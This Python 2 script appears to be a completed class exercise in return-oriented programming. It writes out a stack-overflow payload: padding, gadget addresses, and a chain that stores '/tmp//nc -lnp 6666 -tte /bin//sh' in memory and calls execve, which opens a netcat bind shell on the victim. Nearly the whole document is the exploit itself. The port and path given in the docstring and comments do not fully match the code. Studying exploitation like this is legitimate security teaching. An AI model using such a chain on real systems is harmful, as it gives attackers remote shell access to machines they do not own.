"""
This is incomplete code and you are supposed to complete it.
We want to execute "/tmp/nc -lnp 5678 -tte /bin/sh" via execve syscall.

----------------------------------------
execve calling convention:

1. EAX = 11
2. EBX = "/tmp//nc" (char *)
3. ECX = arguments (char **) -> char *arguments[7]= { "/tmp//nc", "-lnp", "5678", "-tte", "/bin//sh", NULL}
4. EDX = env (char **) -> NULL
-----------------------------------------

The gadgets in the following code are based on my machine & binary and as a result you will have to adjust the gadget based on your environment.
With the latest ROPGadget tool that we used in the class, we get the following ropchain:
- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x8056d05 mov dword ptr [edx], eax ; ret -> MOVISTACK
	[+] Gadget found: 0x806ee8b pop edx ; ret -> POPEDX
	[+] Gadget found: 0x80a8bf6 pop eax ; ret -> POPEAX
	[+] Gadget found: 0x80562c0 xor eax, eax ; ret -> XOREAX

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x80562c0 xor eax, eax ; ret
	[+] Gadget found: 0x807c32a inc eax ; ret -> INCEAX

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret -> POPEBX
	[+] Gadget found: 0x806eeb2 pop ecx ; pop ebx ; ret -> POPECX remember there is an extra POP, so you need to provide something meaningful for ebx too!
	[+] Gadget found: 0x806ee8b pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049603 int 0x80

- Step 5 -- Build the ROP chain

MINE:
0x0806f051 : pop ecx ; pop ebx ; ret
 
"""


from struct import pack
import os
######################################
fileName=raw_input("Enter the file name")
outfile=open(fileName, "wb")

STACK     = pack('<I', 0x080eb060) # @ .data
INT80     = pack('<I', 0x080494c1) # int 0x80
POPEDX    = pack('<I', 0x0806f02a) # pop edx ; ret
POPEAX    = pack('<I', 0x080bbb96) # pop eax ; ret
MOVDWORD  = pack('<I', 0x0809abdd) # mov dword ptr [edx], eax ; ret
XOREAX    = pack('<I', 0x080545a0) # xor eax, eax ; ret
POPEBX    = pack('<I', 0x080481c9) # pop ebx ; ret
POPECXEBX = pack('<I', 0x0806f051) # pop ecx ; pop ebx ; ret
INCEAX    = pack('<I', 0x0807bb16) # inc eax ; ret

POPALL    = pack('<I', 0x0806f050) # pop edx ; pop ecx ; pop ebx ; ret
POPECX    = pack('<I', 0x080e5355) # pop ecx ; ret
DUMMY     = pack('<I', 0x42424242) # padding

# Padding goes here
p = '\x41'*44

p += POPEDX
p += pack('<I', 0x080eb060) # @ .data
p += POPEAX
p += '/tmp'
p += MOVDWORD
p += POPEDX
p += pack('<I', 0x080eb064) # @ .data + 4
p += POPEAX
p += '//nc'
p += MOVDWORD
p += POPEDX
p += pack('<I', 0x080eb068) # @ .data + 8
p += XOREAX
p += MOVDWORD

p += POPEDX
p += pack('<I', 0x080eb069) # @ .data + 9
p += POPEAX
p += '-lnp'
p += MOVDWORD
p += POPEDX
p += pack('<I', 0x080eb06d) # @ .data + 13
p += XOREAX
p += MOVDWORD

p += POPEDX
p += pack('<I', 0x080eb06e) # @ .data + 14
p += POPEAX
p += '6666'
p += MOVDWORD
p += POPEDX
p += pack('<I', 0x080eb072) # @ .data + 18
p += XOREAX
p += MOVDWORD

p += POPEDX
p += pack('<I', 0x080eb073) # @ .data + 19
p += POPEAX
p += '-tte'
p += MOVDWORD
p += POPEDX
p += pack('<I', 0x080eb077) # @ .data + 23
p += XOREAX
p += MOVDWORD

p += POPEDX
p += pack('<I', 0x080eb078) # @ .data + 24
p += POPEAX
p += '/bin'
p += MOVDWORD
p += POPEDX
p += pack('<I', 0x080eb07c) # @ .data + 28
p += POPEAX
p += '//sh'
p += MOVDWORD
p += POPEDX
p += pack('<I', 0x080eb080) # @ .data + 32
p += XOREAX
p += MOVDWORD

# once done, start seting up arguments[] see example python code exploit-nc.py at line 130
# We currently have our list of elements separated by \0
# Now we must construct our char ** i.e. array 'argguments' of strings
# arguments=[ @"/bin//nc", @"-lnp", @"6666", @"-tte", @"/bin//sh"]

# choose an address after @.data + len(commandline +1). Lets call it X. later on, this will be the content of ecx.

p += POPEDX
p += pack('<I', 0x080eb060 + 60) # shadow stack address (@ of arguments)
p += POPEAX
p += pack('<I', 0x080eb060)      # @ of "/bin//nc"
p += MOVDWORD

p += POPEDX
p += pack('<I', 0x080eb060 + 64) # shadow stack address (@ of arguments)
p += POPEAX
p += pack('<I', 0x080eb069)      # @ of "-lnp"
p += MOVDWORD

p += POPEDX
p += pack('<I', 0x080eb060 + 68) # shadow stack address (@ of arguments)
p += POPEAX
p += pack('<I', 0x080eb06e)      # @ of "6666"
p += MOVDWORD

p += POPEDX
p += pack('<I', 0x080eb060 + 72) # shadow stack address (@ of arguments)
p += POPEAX
p += pack('<I', 0x080eb073)      # @ of "-tte"
p += MOVDWORD

p += POPEDX
p += pack('<I', 0x080eb060 + 76) # shadow stack address (@ of arguments)
p += POPEAX
p += pack('<I', 0x080eb078)      # @ of "/bin//sh"
p += MOVDWORD
p += POPEDX
p += pack('<I', 0x080eb060 + 84) # @ .data + 32
p += XOREAX
p += MOVDWORD

#once done, we start setting up the environment for execve.
# first set ebx to point to which command we want to execute (@ /tmp//nc)
#p += pack('<I', 0x080481c9) # pop ebx ; ret #remember to change the address
#p += pack('<I', 0x080da060) # @ .data -> ebx is set to program to execute [point 2]
#

p += POPEBX
p += STACK

## now set ecx to have address of arguments[]
#p += pack('<I', 0x0806eeb2) # pop ecx ; pop ebx ; ret
#p += pack('<I', 0x080da068) # change this to X --> @ .data + + len(commandline +1) -> ecx=0x080da068
#p += pack('<I', 0x080da060) # padding without overwrite ebx 
#p += pack('<I', 0x0806ee8b) # pop edx ; ret
#p += pack('<I', 0x080da068) # @ .data + 8 edx=NULL [point 4]
#p += pack('<I', 0x080562c0) # xor eax, eax ; ret eax=0
#...

p += POPECXEBX
p += pack('<I', 0x080eb060 + 60)      # len(commandline + 1)
p += pack('<I', 0x080eb060) # padding without overwrite ebx 
p += POPEDX
p += pack('<I', 0x080eb060 + 8) # @ .data + 8 edx=NULL [point 4]

p += pack('<I', 0x080545a0) # xor eax, eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x0807bb16) # inc eax ; ret
p += pack('<I', 0x080494c1) # int 0x80

outfile.write(p)
outfile.close()
